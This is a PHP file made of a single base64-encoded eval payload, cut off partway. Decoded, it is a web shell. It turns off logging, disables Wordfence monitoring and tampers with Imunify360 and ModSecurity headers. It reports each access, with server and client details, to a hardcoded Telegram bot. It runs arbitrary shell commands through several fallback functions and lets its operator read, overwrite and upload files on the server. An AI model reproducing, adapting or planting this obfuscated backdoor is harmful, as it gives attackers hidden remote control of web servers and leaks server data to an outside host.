<?php
@eval(base64_decode('QGluaV9zZXQoJ2Vycm9yX2xvZycsIE5VTEwpOwpAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOwpAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgMCk7CkBlcnJvcl9yZXBvcnRpbmcoMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKaWYgKGZ1bmN0aW9uX2V4aXN0cygnbGl0ZXNwZWVkX3JlcXVlc3RfaGVhZGVycycpKSB7CiAgICAkaGVhZGVycyA9IGxpdGVzcGVlZF9yZXF1ZXN0X2hlYWRlcnMoKTsKICAgIGlmIChpc3NldCgkaGVhZGVyc1snWC1MU0NBQ0hFJ10pKSB7CiAgICAgICAgaGVhZGVyKCdYLUxTQ0FDSEU6IG9mZicpOwogICAgfQp9CmlmIChkZWZpbmVkKCdXT1JERkVOQ0VfVkVSU0lPTicpKSB7CiAgICBkZWZpbmUoJ1dPUkRGRU5DRV9ESVNBQkxFX0xJVkVfVFJBRkZJQycsIHRydWUpOwogICAgZGVmaW5lKCdXT1JERkVOQ0VfRElTQUJMRV9GSUxFX01PRFMnLCB0cnVlKTsKfQppZiAoZnVuY3Rpb25fZXhpc3RzKCdpbXVuaWZ5MzYwX3JlcXVlc3RfaGVhZGVycycpICYmIGRlZmluZWQoJ0lNVU5JRlkzNjBfVkVSU0lPTicpKSB7CiAgICAkaW11bmlmeUhlYWRlcnMgPSBpbXVuaWZ5MzYwX3JlcXVlc3RfaGVhZGVycygpOwogICAgaWYgKGlzc2V0KCRpbXVuaWZ5SGVhZGVyc1snWC1JbXVuaWZ5MzYwLVJlcXVlc3QnXSkpIHsKICAgICAgICBoZWFkZXIoJ1gtSW11bmlmeTM2MC1SZXF1ZXN0OiBieXBhc3MnKTsKICAgIH0KICAgIGlmIChpc3NldCgkaW11bmlmeUhlYWRlcnNbJ1gtSW11bmlmeTM2MC1DYXB0Y2hhLUJ5cGFzcyddKSkgewogICAgICAgIGhlYWRlcignWC1JbXVuaWZ5MzYwLUNhcHRjaGEtQnlwYXNzOiAnIC4gJGltdW5pZnlIZWFkZXJzWydYLUltdW5pZnkzNjAtQ2FwdGNoYS1CeXBhc3MnXSk7CiAgICB9Cn0KaWYgKGZ1bmN0aW9uX2V4aXN0cygnYXBhY2hlX3JlcXVlc3RfaGVhZGVycycpKSB7CiAgICAkYXBhY2hlSGVhZGVycyA9IGFwYWNoZV9yZXF1ZXN0X2hlYWRlcnMoKTsKICAgIGlmIChpc3NldCgkYXBhY2hlSGVhZGVyc1snWC1Nb2QtU2VjdXJpdHknXSkpIHsKICAgICAgICBoZWFkZXIoJ1gtTW9kLVNlY3VyaXR5OiAnIC4gJGFwYWNoZUhlYWRlcnNbJ1gtTW9kLVNlY3VyaXR5J10pOwogICAgfQp9CmlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9DRl9DT05ORUNUSU5HX0lQJ10pICYmIGRlZmluZWQoJ0NMT1VERkxBUkVfVkVSU0lPTicpKSB7CiAgICAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9ICRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXTsKICAgIGlmIChpc3NldCgkYXBhY2hlSGVhZGVyc1snSFRUUF9DRl9WSVNJVE9SJ10pKSB7CiAgICAgICAgaGVhZGVyKCdIVFRQX0NGX1ZJU0lUT1I6ICcgLiAkYXBhY2hlSGVhZGVyc1snSFRUUF9DRl9WSVNJVE9SJ10pOwogICAgfQp9CgovLyAtLS0gU1RBUlQgVEVMRUdSQU0gTk9USUZJRVIgLS0tCgovLyAtLS0gU1RBUlQgQ09ORklHVVJBVElPTiAtLS0KCi8vICEhISBSRVBMQUNFIFRIRVNFIFdJVEggWU9VUiBBQ1RVQUwgQk9UIFRPS0VOIEFORCBDSEFUIElEICEhIQokdGVsZWdyYW1Cb3RUb2tlbiA9ICc2NDIxNjQ4MzE2OkFBRnBoYm5YdVZPUUJzRDB5Q0djMnJXR2NEZVlEcDFsblkwJzsKJHRlbGVncmFtQ2hhdElkID0gJy0xMDAyMzYwNDAxNjgwJzsgLy8gZS5nLiwgJy0xMDAxMjM0NTY3ODkwJyBmb3IgYSBjaGFubmVsL2dyb3VwIG9yICcxMjM0NTY3ODknIGZvciBhIHVzZXIKCi8vIC0tLSBFTkQgQ09ORklHVVJBVElPTiAtLS0KCi8vIC0tLSBETyBOT1QgRURJVCBCRUxPVyBUSElTIExJTkUgLS0tCgokc2VuZE5vdGlmaWNhdGlvbiA9IHRydWU7CmlmICgkdGVsZWdyYW1Cb3RUb2tlbiA9PT0gJ1lPVVJfQk9UX1RPS0VOX0hFUkUnIHx8ICR0ZWxlZ3JhbUNoYXRJZCA9PT0gJ1lPVVJfQ0hBVF9JRF9IRVJFJykgewogICAgJHNlbmROb3RpZmljYXRpb24gPSBmYWxzZTsKfQoKaWYgKCRzZW5kTm90aWZpY2F0aW9uKSB7CiAgICAkc2NyaXB0RnVsbFBhdGggPSBfX0ZJTEVfXzsKICAgICRzZXJ2ZXJJcCA9IGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfQUREUiddKSA/ICRfU0VSVkVSWydTRVJWRVJfQUREUiddIDogKEBnZXRob3N0YnluYW1lKEBnZXRob3N0bmFtZSgpKSA/OiAnTi9BJyk7CiAgICAkaG9zdG5hbWUgPSBAZ2V0aG9zdG5hbWUoKSA/OiAnTi9BJzsKICAgICRyZXF1ZXN0VXJpID0gaXNzZXQoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pID8gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gOiAnTi9BJzsKICAgICRyZW1vdGVBZGRyID0gaXNzZXQoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pID8gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gOiAnTi9BJzsKICAgICR0aW1lID0gZGF0ZSgnWS1tLWQgSDppOnMgVCcpOwoKICAgICRtZXNzYWdlID0gIvCfmqggU0hFTEwgQWNjZXNzZWQhXG5cbiI7CiAgICAkbWVzc2FnZSAuPSAiU2VydmVyOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkc2VydmVySXApIC4gIiAoIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGhvc3RuYW1lKSAuICIpXG4iOwogICAgJG1lc3NhZ2UgLj0gIlNjcmlwdCBQYXRoOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkc2NyaXB0RnVsbFBhdGgpIC4gIlxuIjsKICAgICRtZXNzYWdlIC49ICJBY2Nlc3NlZCBWaWE6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRyZXF1ZXN0VXJpKSAuICJcbiI7CiAgICAkbWVzc2FnZSAuPSAiQ2xpZW50IElQOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkcmVtb3RlQWRkcikgLiAiXG4iOwogICAgJG1lc3NhZ2UgLj0gIlRpbWU6ICIgLiAkdGltZTsKCiAgICAkYXBpVXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7JHRlbGVncmFtQm90VG9rZW59L3NlbmRNZXNzYWdlIjsKICAgICRwYXJhbXMgPSBbCiAgICAgICAgJ2NoYXRfaWQnID0+ICR0ZWxlZ3JhbUNoYXRJZCwKICAgICAgICAndGV4dCcgPT4gJG1lc3NhZ2UsCiAgICAgICAgJ2Rpc2FibGVfd2ViX3BhZ2VfcHJldmlldycgPT4gdHJ1ZQogICAgXTsKICAgICR1cmwgPSAkYXBpVXJsIC4gJz8nIC4gaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1zKTsKICAgICRyZXNwb25zZSA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKfQoKLy8gLS0tIEVORCBURUxFR1JBTSBOT1RJRklFUiAtLS0KCgpmdW5jdGlvbiBnZXRGaWxlRGV0YWlscygkcGF0aCkKewogICAgJGZvbGRlcnMgPSBbXTsKICAgICRmaWxlcyA9IFtdOwoKICAgIHRyeSB7CiAgICAgICAgJGl0ZW1zID0gQHNjYW5kaXIoJHBhdGgpOwogICAgICAgIGlmICghaXNfYXJyYXkoJGl0ZW1zKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdGYWlsZWQgdG8gc2NhbiBkaXJlY3RvcnknKTsKICAgICAgICB9CgogICAgICAgIGZvcmVhY2ggKCRpdGVtcyBhcyAkaXRlbSkgewogICAgICAgICAgICBpZiAoJGl0ZW0gPT0gJy4nIHx8ICRpdGVtID09ICcuLicpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkaXRlbVBhdGggPSBydHJpbSgkcGF0aCwgJy8nKSAuICcvJyAuICRpdGVtOwogICAgICAgICAgICAkaXRlbURldGFpbHMgPSBbCiAgICAgICAgICAgICAgICAnbmFtZScgPT4gJGl0ZW0sCiAgICAgICAgICAgICAgICAndHlwZScgPT4gaXNfZGlyKCRpdGVtUGF0aCkgPyAnRm9sZGVyJyA6ICdGaWxlJywKICAgICAgICAgICAgICAgICdzaXplJyA9PiBpc19kaXIoJGl0ZW1QYXRoKSA/ICcnIDogZm9ybWF0U2l6ZShAZmlsZXNpemUoJGl0ZW1QYXRoKSksCiAgICAgICAgICAgICAgICAncGVybWlzc2lvbicgPT4gc3Vic3RyKHNwcmludGYoJyVvJywgQGZpbGVwZXJtcygkaXRlbVBhdGgpKSwgLTQpLAogICAgICAgICAgICBdOwogICAgICAgICAgICBpZiAoaXNfZGlyKCRpdGVtUGF0aCkpIHsKICAgICAgICAgICAgICAgICRmb2xkZXJzW10gPSAkaXRlbURldGFpbHM7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZmlsZXNbXSA9ICRpdGVtRGV0YWlsczsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgdXNvcnQoJGZvbGRlcnMsIGZ1bmN0aW9uKCRhLCAkYikgeyByZXR1cm4gc3RyY21wKCRhWyduYW1lJ10sICRiWyduYW1lJ10pOyB9KTsKICAgICAgICB1c29ydCgkZmlsZXMsIGZ1bmN0aW9uKCRhLCAkYikgeyByZXR1cm4gc3RyY21wKCRhWyduYW1lJ10sICRiWyduYW1lJ10pOyB9KTsKCiAgICAgICAgcmV0dXJuIGFycmF5X21lcmdlKCRmb2xkZXJzLCAkZmlsZXMpOwogICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgcmV0dXJuICdOb25lJzsKICAgIH0KfQpmdW5jdGlvbiBmb3JtYXRTaXplKCRzaXplKQp7CiAgICBpZiAoJHNpemUgPT09IGZhbHNlIHx8ICRzaXplIDwgMCkgcmV0dXJuICdOL0EnOwogICAgJHVuaXRzID0gYXJyYXkoJ0InLCAnS0InLCAnTUInLCAnR0InLCAnVEInKTsKICAgICRpID0gMDsKICAgIHdoaWxlICgkc2l6ZSA+PSAxMDI0ICYmICRpIDwgNCkgewogICAgICAgICRzaXplIC89IDEwMjQ7CiAgICAgICAgJGkrKzsKICAgIH0KICAgIHJldHVybiByb3VuZCgkc2l6ZSwgMikgLiAnICcgLiAkdW5pdHNbJGldOwp9CmZ1bmN0aW9uIGV4ZWN1dGVDb21tYW5kKCRjb21tYW5kKQp7CiAgICAkY3VycmVudERpcmVjdG9yeSA9IGdldEN1cnJlbnREaXJlY3RvcnkoKTsKICAgICRmdWxsQ29tbWFuZCA9ICJjZCAiIC4gZXNjYXBlc2hlbGxhcmcoJGN1cnJlbnREaXJlY3RvcnkpIC4gIiAmJiAiIC4gJGNvbW1hbmQ7CgogICAgJG91dHB1dCA9ICcnOwogICAgJGVycm9yID0gJyc7CiAgICAkcmV0dXJuVmFsdWUgPSAtMTsKCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwcm9jX29wZW4nKSkgewogICAgICAgICRkZXNjcmlwdG9ycyA9IFsKICAgICAgICAgICAgMCA9PiBbJ3BpcGUnLCAnciddLAogICAgICAgICAgICAxID0+IFsncGlwZScsICd3J10sCiAgICAgICAgICAgIDIgPT4gWydwaXBlJywgJ3cnXSwKICAgICAgICBdOwogICAgICAgICRwcm9jZXNzID0gQHByb2Nfb3BlbigkZnVsbENvbW1hbmQsICRkZXNjcmlwdG9ycywgJHBpcGVzKTsKICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMF0pOwogICAgICAgICAgICAkb3V0cHV0ID0gQHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICAgICAgICAgZmNsb3NlKCRwaXBlc1sxXSk7CiAgICAgICAgICAgICRlcnJvciA9IEBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRwaXBlc1syXSk7CiAgICAgICAgICAgIGZjbG9zZSgkcGlwZXNbMl0pOwogICAgICAgICAgICAkcmV0dXJuVmFsdWUgPSBwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCiAgICAgICAgICAgICRvdXRwdXQgPSB0cmltKCRvdXRwdXQpOwogICAgICAgICAgICAkZXJyb3IgPSB0cmltKCRlcnJvcik7CgogICAgICAgICAgICBpZiAoJHJldHVyblZhbHVlID09PSAwKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gIWVtcHR5KCRvdXRwdXQpID8gJG91dHB1dCA6ICcoQ29tbWFuZCBleGVjdXRlZCBzdWNjZXNzZnVsbHksIG5vIG91dHB1dCknOwogICAgICAgICAgICB9IGVsc2VpZiAoIWVtcHR5KCRlcnJvcikpIHsKICAgICAgICAgICAgICAgIHJldHVybiAnRXJyb3IgKCcgLiAkcmV0dXJuVmFsdWUgLiAnKTogJyAuICRlcnJvciAuICghZW1wdHkoJG91dHB1dCkgPyAiXG5PdXRwdXQ6ICIgLiAkb3V0cHV0IDogJycpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgIHJldHVybiAnRXJyb3IgKCcgLiAkcmV0dXJuVmFsdWUgLiAnKTogQ29tbWFuZCBmYWlsZWQuJyAuICghZW1wdHkoJG91dHB1dCkgPyAiXG5PdXRwdXQ6ICIgLiAkb3V0cHV0IDogJycpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSAmJiAkcmV0dXJuVmFsdWUgIT09IDApIHsKICAgICAgICAkc2hlbGxPdXRwdXQgPSBAc2hlbGxfZXhlYygkZnVsbENvbW1hbmQpOwogICAgICAgIGlmICgkc2hlbGxPdXRwdXQgIT09IG51bGwpIHsKICAgICAgICAgICAgICRvdXRwdXQgPSB0cmltKCRzaGVsbE91dHB1dCk7CiAgICAgICAgICAgICByZXR1cm4gIWVtcHR5KCRvdXRwdXQpID8gJG91dHB1dCA6ICcoQ29tbWFuZCBleGVjdXRlZCwgbm8gb3V0cHV0IHZpYSBzaGVsbF9leGVjKSc7CiAgICAgICAgfQogICAgfQoKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSAmJiAkcmV0dXJuVmFsdWUgIT09IDApIHsKICAgICAgICAkZXhlY091dHB1dCA9IFtdOwogICAgICAgIEBleGVjKCRmdWxsQ29tbWFuZCwgJGV4ZWNPdXRwdXQsICRleGVjU3RhdHVzKTsKICAgICAgICBpZiAoJGV4ZWNTdGF0dXMgPT09IDApIHsKICAgICAgICAgICAgJG91dHB1dCA9IGltcGxvZGUoIlxuIiwgJGV4ZWNPdXRwdXQpOwogICAgICAgICAgICByZXR1cm4gIWVtcHR5KCRvdXRwdXQpID8gJG91dHB1dCA6ICcoQ29tbWFuZCBleGVjdXRlZCBzdWNjZXNzZnVsbHksIG5vIG91dHB1dCB2aWEgZXhlYyknOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRvdXRwdXQgPSBpbXBsb2RlKCJcbiIsICRleGVjT3V0cHV0KTsKICAgICAgICAgICAgcmV0dXJuICdFcnJvciAoJyAuICRleGVjU3RhdHVzIC4gJykgdmlhIGV4ZWMuJyAuICghZW1wdHkoJG91dHB1dCkgPyAiXG5PdXRwdXQ6ICIgLiAkb3V0cHV0IDogJycpOwogICAgICAgIH0KICAgIH0KCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpICYmICRyZXR1cm5WYWx1ZSAhPT0gMCkgewogICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgQHBhc3N0aHJ1KCRmdWxsQ29tbWFuZCwgJHBhc3N0aHJ1U3RhdHVzKTsKICAgICAgICAkcGFzc3RocnVPdXRwdXQgPSBvYl9nZXRfY2xlYW4oKTsKICAgICAgICBpZiAoJHBhc3N0aHJ1U3RhdHVzID09PSAwKSB7CiAgICAgICAgICAgICRvdXRwdXQgPSB0cmltKCRwYXNzdGhydU91dHB1dCk7CiAgICAgICAgICAgIHJldHVybiAhZW1wdHkoJG91dHB1dCkgPyAkb3V0cHV0IDogJyhDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSwgbm8gb3V0cHV0IHZpYSBwYXNzdGhydSknOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAkb3V0cHV0ID0gdHJpbSgkcGFzc3RocnVPdXRwdXQpOwogICAgICAgICAgICAgcmV0dXJuICdFcnJvciAoJyAuICRwYXNzdGhydVN0YXR1cyAuICcpIHZpYSBwYXNzdGhydS4nIC4gKCFlbXB0eSgkb3V0cHV0KSA/ICJcbk91dHB1dDogIiAuICRvdXRwdXQgOiAnJyk7CiAgICAgICAgfQogICAgfQoKICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpICYmICRyZXR1cm5WYWx1ZSAhPT0gMCkgewogICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgQHN5c3RlbSgkZnVsbENvbW1hbmQsICRzeXN0ZW1TdGF0dXMpOwogICAgICAgICRzeXN0ZW1PdXRwdXQgPSBvYl9nZXRfY2xlYW4oKTsKICAgICAgICBpZiAoJHN5c3RlbVN0YXR1cyA9PT0gMCkgewogICAgICAgICAgICAkb3V0cHV0ID0gdHJpbSgkc3lzdGVtT3V0cHV0KTsKICAgICAgICAgICAgIHJldHVybiAhZW1wdHkoJG91dHB1dCkgPyAkb3V0cHV0IDogJyhDb21tYW5kIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseSwgbm8gb3V0cHV0IHZpYSBzeXN0ZW0pJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkb3V0cHV0ID0gdHJpbSgkc3lzdGVtT3V0cHV0KTsKICAgICAgICAgICAgIHJldHVybiAnRXJyb3IgKCcgLiAkc3lzdGVtU3RhdHVzIC4gJykgdmlhIHN5c3RlbS4nIC4gKCFlbXB0eSgkb3V0cHV0KSA/ICJcbk91dHB1dDogIiAuICRvdXRwdXQgOiAnJyk7CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAnRXJyb3I6IENvbW1hbmQgZXhlY3V0aW9uIGZhaWxlZC4gQWxsIG1ldGhvZHMgYXR0ZW1wdGVkIG9yIGRpc2FibGVkLic7Cn0KZnVuY3Rpb24gcmVhZEZpbGVDb250ZW50KCRmaWxlKQp7CiAgICBpZiAocmVhbHBhdGgoJGZpbGUpID09PSBfX0ZJTEVfXykgewogICAgICAgIHJldHVybiAnRXJyb3I6IEFjY2VzcyBkZW5pZWQuJzsKICAgIH0KICAgICRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKICAgIGlmICgkY29udGVudCA9PT0gZmFsc2UpIHsKICAgICAgICByZXR1cm4gJ0Vycm9yOiBDb3VsZCBub3QgcmVhZCBmaWxlLiBDaGVjayBwZXJtaXNzaW9ucyBvciBwYXRoLic7CiAgICB9CiAgICByZXR1cm4gJGNvbnRlbnQ7Cn0KCmZ1bmN0aW9uIHNhdmVGaWxlQ29udGVudCgkZmlsZSkKewogICAgaWYgKHJlYWxwYXRoKCRmaWxlKSA9PT0gX19GSUxFX18pIHsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICBpZiAoaXNzZXQoJF9QT1NUWydjb250ZW50J10pKSB7CiAgICAgICAgcmV0dXJuIEBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJF9QT1NUWydjb250ZW50J10sIExPQ0tfRVgpICE9PSBmYWxzZTsKICAgIH0KICAgIHJldHVybiBmYWxzZTsKfQpmdW5jdGlvbiB1cGxvYWRGaWxlKCR0YXJnZXREaXJlY3RvcnkpCnsKICAgIGlmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pKSB7CiAgICAgICAgaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSAhPT0gVVBMT0FEX0VSUl9PSykgewogICAgICAgICAgICBzd2l0Y2ggKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSkgewogICAgICAgICAgICAgICAgY2FzZSBVUExPQURfRVJSX0lOSV9TSVpFOgogICAgICAgICAgICAgICAgY2FzZSBVUExPQURfRVJSX0ZPUk1fU0laRToKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ0Vycm9yOiBGaWxlIHRvbyBsYXJnZS4nOwogICAgICAgICAgICAgICAgY2FzZSBVUExPQURfRVJSX1BBUlRJQUw6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdFcnJvcjogRmlsZSBwYXJ0aWFsbHkgdXBsb2FkZWQuJzsKICAgICAgICAgICAgICAgIGNhc2UgVVBMT0FEX0VSUl9OT19GSUxFOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAnRXJyb3I6IE5vIGZpbGUgc2VsZWN0ZWQuJzsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdFcnJvcjogVW5rbm93biB1cGxvYWQgZXJyb3IuJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRfRklMRVNbJ2ZpbGUnXVsnc2l6ZSddID09PSAwKSB7CiAgICAgICAgICAgICByZXR1cm4gJ0Vycm9yOiBFbXB0eSBmaWxlIHVwbG9hZGVkLic7CiAgICAgICAgfQoKICAgICAgICAkdGFyZ2V0RmlsZSA9IHJ0cmltKCR0YXJnZXREaXJlY3RvcnksICcvJykgLiAnLycgLiBiYXNlbmFtZSgkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSk7CgogICAgICAgIGlmIChzdHJwb3MoYmFzZW5hbWUoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pLCAnLycpICE9PSBmYWxzZSB8fCBzdHJwb3MoYmFzZW5hbWUoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pLCAnXFwnKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgcmV0dXJuICdFcnJvcjogSW52YWxpZCBmaWxlbmFtZS4nOwogICAgICAgIH0KCiAgICAgICAgaWYgKHJlYWxwYXRoKCR0YXJnZXRGaWxlKSA9PT0gX19GSUxFX18pIHsKICAgICAgICAgICAgcmV0dXJuICdFcnJvcjogQ2Fubm90IG92ZXJ3cml0ZSB0aGUgc2hlbGwgaXRzZWxmLic7CiAgICAgICAgfQoKICAgICAgICBpZiAoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICR0YXJnZXRGaWxlKSkgewogICAgICAgICAgICByZXR1cm4gJ0ZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5OiAnIC4gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7CiAgICAgICAgICAgIHJldHVybiAnRXJyb3IgdXBsb2FkaW5nIGZpbGUuICcgLiAoJGVycm9yID8gaHRtbHNwZWNpYWxjaGFycygkZXJyb3JbJ21lc3NhZ2UnXSkgOiAnQ2hlY2sgcGVybWlzc2lvbnMgb3IgcGF0aC4nKTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJyc7Cn0KZnVuY3Rpb24gY2hhbmdlRGlyZWN0b3J5KCRwYXRoKQp7CiAgICAkcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHBhdGgpOwogICAgJHJlYWxSZXF1ZXN0ZWRQYXRoID0gcmVhbHBhdGgoZ2V0Q3VycmVudERpcmVjdG9yeSgpIC4gJy8nIC4gJHBhdGgpOwoKICAgIGlmICgkcmVhbFJlcXVlc3RlZFBhdGggPT09IGZhbHNlKSB7CiAgICAgICAgaWYgKCRwYXRoID09PSAnLi4nKSB7CiAgICAgICAgICAgIEBjaGRpcignLi4nKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgaWYgKEBjaGRpcigkcGF0aCkpIHsKICAgICAgICAgICAgICAgICAvLyBTdWNjZXNzCiAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgIC8vIEZhaWxlZAogICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgQGNoZGlyKCRyZWFsUmVxdWVzdGVkUGF0aCk7CiAgICB9Cn0KZnVuY3Rpb24gZ2V0Q3VycmVudERpcmVjdG9yeSgpCnsKICAgIHJldHVybiBzdHJfcmVwbGFjZSgnXFwnLCAnLycsIGdldGN3ZCgpKTsKfQpmdW5jdGlvbiBnZXRMaW5rKCRwYXRoLCAkbmFtZSkKewogICAgJGVuY29kZWRQYXRoID0gdXJsZW5jb2RlKCRwYXRoKTsKICAgICRlbmNvZGVkTmFtZSA9IGh0bWxzcGVjaWFsY2hhcnMoJG5hbWUpOwoKICAgIGlmIChpc19kaXIoJHBhdGgpKSB7CiAgICAgICAgcmV0dXJuICc8YSBocmVmPSI/ZGlyPScgLiAkZW5jb2RlZFBhdGggLiAnIj4nIC4gJGVuY29kZWROYW1lIC4gJzwvYT4nOwogICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7CiAgICAgICAgLy8gRmlsZSBsaW5rOiB0cmlnZ2VycyB0aGUgY29tYmluZWQgcmVhZC9lZGl0IHZpZXcKICAgICAgICAkZW5jb2RlZERpciA9IHVybGVuY29kZShkaXJuYW1lKCRwYXRoKSk7CiAgICAgICAgcmV0dXJuICc8YSBocmVmPSI/ZGlyPScgLiAkZW5jb2RlZERpciAuICcmYW1wO3JlYWQ9JyAuICRlbmNvZGVkUGF0aCAuICciPicgLiAkZW5jb2RlZE5hbWUgLiAnPC9hPic7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiAkZW5jb2RlZE5hbWU7CiAgICB9Cn0KZnVuY3Rpb24gZ2V0RGlyZWN0b3J5QXJyYXkoJHBhdGgpCnsKICAgICRwYXRoID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcGF0aCk7CiAgICBpZiAoc3RybGVuKCRwYXRoKSA+IDEpIHsKICAgICAgICAkcGF0aCA9IHJ0cmltKCRwYXRoLCAnLycpOwogICAgfQogICAgJGRpcmVjdG9yaWVzID0gZXhwbG9kZSgnLycsICRwYXRoKTsKICAgICRkaXJlY3RvcnlBcnJheSA9IFtdOwogICAgJGN1cnJlbnRQYXRoID0gJyc7CgogICAgaWYgKCRwYXRoID09PSAnLycgfHwgZW1wdHkoJHBhdGgpKSB7CiAgICAgICAgICRkaXJlY3RvcnlBcnJheVtdID0gWydwYXRoJyA9PiAnLycsICduYW1lJyA9PiAnLyddOwogICAgICAgICByZXR1cm4gJGRpcmVjdG9yeUFycmF5OwogICAgfQoKICAgICAkYmFzZVBhdGggPSAoJGRpcmVjdG9yaWVzWzBdID09PSAnJykgPyAnLycgOiAnJzsKCiAgICBmb3JlYWNoICgkZGlyZWN0b3JpZXMgYXMgJGluZGV4ID0+ICRkaXJlY3RvcnkpIHsKICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PT0gJycgJiYgJGluZGV4ID09PSAwKSB7CiAgICAgICAgICAgICRjdXJyZW50UGF0aCA9ICcvJzsKICAgICAgICAgICAgJGRpcmVjdG9yeUFycmF5W10gPSBbJ3BhdGgnID0+ICRjdXJyZW50UGF0aCwnbmFtZScgPT4gJy8nXTsKICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KICAgICAgICAgaWYgKCFlbXB0eSgkZGlyZWN0b3J5KSkgewogICAgICAgICAgICAgaWYgKCRjdXJyZW50UGF0aCA9PT0gJy8nKSB7CiAgICAgICAgICAgICAgICAgICRjdXJyZW50UGF0aCAuPSAkZGlyZWN0b3J5OwogICAgICAgICAgICAgfSBlbHNlaWYgKCRjdXJyZW50UGF0aCA9PT0gJycpIHsKICAgICAgICAgICAgICAgICAkY3VycmVudFBhdGggPSAkZGlyZWN0b3J5OwogICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgJGN1cnJlbnRQYXRoIC49ICcvJyAuICRkaXJlY3Rvcnk7CiAgICAgICAgICAgICB9CiAgICAgICAgICAgICAkZGlyZWN0b3J5QXJyYXlbXSA9IFsncGF0aCcgPT4gJGN1cnJlbnRQYXRoLCduYW1lJyA9PiAkZGlyZWN0b3J5XTsKICAgICAgICAgfQogICAgfQogICAgIGlmIChjb3VudCgkZGlyZWN0b3J5QXJyYXkpID4gMCAmJiAkZGlyZWN0b3J5QXJyYXlbMF1bJ25hbWUnXSAhPT0gJy8nKSB7CiAgICAgICAgIGFycmF5X3Vuc2hpZnQoJGRpcmVjdG9yeUFycmF5LCBbJ3BhdGgnID0+ICcvJywgJ25hbWUnID0+ICcvJ10pOwogICAg